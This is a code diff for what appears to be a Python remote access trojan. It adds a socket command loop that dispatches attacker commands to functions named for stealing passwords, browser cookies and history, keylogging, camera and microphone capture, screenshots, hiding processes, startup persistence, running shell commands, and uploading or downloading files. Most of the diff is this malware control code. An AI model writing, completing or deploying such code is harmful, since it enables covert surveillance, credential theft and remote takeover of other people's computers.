@@ -14,6 +14,7 @@ class Functions:
         try:
             self.go = os.chdir(data)
             self.dizin = os.getcwd()
+            return f"{Fore.GREEN}You are currently in this directory : {self.dizin}{Fore.RESET}"
         except Exception as e:
             return f"Error! {e}"
 
@@ -24,12 +25,14 @@ class Functions:
         return self.ip_adress
     def create_file(self, data):
         try:
-            os.mkdir(data)
+            self.file = os.mkdir(data)
+            return f"{Fore.GREEN}Succsesfully to created the file! : {self.file}{Fore.RESET}"
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
     def delete_file(self, data):
         try:
-            os.rmdir(data)
+            self.delete = os.rmdir(data)
+            return f"{Fore.GREEN}Succsesfully to deleted the file : {self.delete}{Fore.RESET}"
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
     def read(self, data):
@@ -39,7 +42,7 @@ class Functions:
                 return self.content
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
-    def  create_file(self, data):
+    def  touch(self, data):
         try:
             with open(data, 'x') as dosya:
                 pass
@@ -245,3 +248,167 @@ class Functions:
             return f"{Fore.GREEN}Clicked the {data}{Fore.RESET}"
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
+
+Functions = Functions()
+
+class Main:
+    host = "localhost"
+    port = 9999
+
+    while True:
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server_socket.bind((host, port))
+        server_socket.listen()
+        print(f"{host}:{port} dinleniyor...")
+
+        try:
+            while True:
+                conn, addr = server_socket.accept()
+                print(f"Connected to {addr}")
+
+                while True:
+                    data = conn.recv(51200).decode()
+                    print(data)
+
+                    if data == "ls":
+                        conn.send(f"{Functions.list_dir()}".encode())
+
+                    elif data.startswith("cd "):
+                        data = data[3:]
+                        conn.send(f"{Functions.cd(data)}".encode())
+
+                    elif data == "ifconfig" or data == "ipconfig":
+                        conn.send(f"{Functions.get_ip()}".encode())
+
+                    elif data.startswith("mkdir "):
+                        data = data[6:]
+                        conn.send(f"{Functions.create_file(data)}".encode())
+
+                    elif data.startswith("rmdir "):
+                        data = data[6:]
+                        conn.send(f"{Functions.delete_file(data)}".encode())
+
+                    elif data.startswith("cat "):
+                        data = data[4:]
+                        conn.send(f"{Functions.read(data)}".encode())
+
+                    elif data.startswith("touch "):
+                        data = data[6:]
+                        conn.send(f"{Functions.touch(data)}".encode())
+
+                    elif data == "pwd":
+                        conn.send(f"{Functions.dizin()}".encode())
+
+                    elif data == "cp":
+                        conn.send(f"{Functions.capture_camera()}".encode())
+
+                    elif data == "password" or data == "pw":
+                        conn.send(f"{Functions.steal_password()}".encode())
+
+                    elif data == "ss" or data == "screenshot":
+                        conn.send(f"{Functions.take_screenshot()}".encode())
+
+                    elif data == "cv" or data == "voice":
+                        conn.send(f"{Functions.voice()}".encode())
+
+                    elif data == "cooike":
+                        conn.send(f"{Functions.steal_cookie()}".encode())
+
+                    elif data == "history":
+                        conn.send(f"{Functions.steal_history()}".encode())
+
+                    elif data.startswith("kill "):
+                        data = data[5:]
+                        conn.send(f"{Functions.kill(data)}".encode())
+
+                    elif data == "ps":
+                        conn.send(f"{Functions.tasklist()}".encode())
+
+                    elif data.startswith("open "):
+                        data = data[5:]
+                        conn.send(f"{Functions.open_program(data)}".encode())
+
+                    elif data.startswith("hide "):
+                        data = data[5:]
+                        conn.send(f"{Functions.hide_program(data)}".encode())
+
+                    elif data.startswith("unhide "):
+                        data = data[7:]
+                        conn.send(f"{Functions.unhide_program(data)}".encode())
+
+                    elif data.startswith("rename "):
+                        data = data[7:]
+                        old_name, new_name = data.split(",")
+                        old_name = old_name.strip()
+                        new_name = new_name.strip()
+
+                        conn.send(f"{Functions.rename(old_name, new_name)}".encode())
+
+                    elif data == "startup":
+                        conn.send(f"{Functions.startup()}".encode())
+
+                    elif data.startswith("download "):
+                        data = data[9:]
+                        conn.send(f"{Functions.download()}".encode())
+
+                    elif data.startswith("upload "):
+                        data = data[7:]
+                        conn.send(f"{Functions.upload()}".encode())
+
+                    elif data == "shutdown":
+                        conn.send(f"{Functions.shutdown()}".encode())
+
+                    elif data == "restart":
+                        conn.send(f"{Functions.restart()}".encode())
+
+                    elif data.startswith("shell "):
+                        data = data[6:]
+                        conn.send(f"{Functions.shell(data)}".encode())
+
+                    elif data.startswith("cmd "):
+                        data = data[4:]
+                        conn.send(f"{Functions.cmd(data)}".encode())
+
+                    elif data.startswith("web "):
+                        data = data[4:]
+                        conn.send(f"{Functions.web(data)}".encode())
+
+                    elif data.startswith("web_background "):
+                        data = data[14:]
+                        conn.send(f"{Functions.web_background(data)}".encode())
+
+                    elif data.startswith("ping "):
+                        data = data[5:]
+                        conn.send(f"{Functions.ping(data)}".encode())
+
+                    elif data == "keylogger":
+                        conn.send(f"{Functions.keylogger()}".encode())
+
+                    elif data.startswith("type "):
+                        data = data[5:]
+                        conn.send(f"{Functions.type(data)}".encode())
+
+                    elif data.startswith("press "):
+                        data = data[6:]
+                        conn.send(f"{Functions.press(data)}".encode())
+
+                    elif data.startswith("moveto "):
+                        data = data[7:].replace(',', '')
+                        x, y = map(int, data.split())
+
+                        conn.send(f"{Functions.moveto(x, y)}".encode())
+
+                    elif data.startswith("click "):
+                        data = data[6:]
+                        conn.send(f"{Functions.click(data)}".encode())
+
+                    elif data == "help" or data == "--help":
+                        pass
+
+                    else:
+                        conn.send(f"{Fore.RED}Invalid option{Fore.RESET}".encode())
+
+        except Exception as e:
+            print(e)
+        finally:
+            conn.close
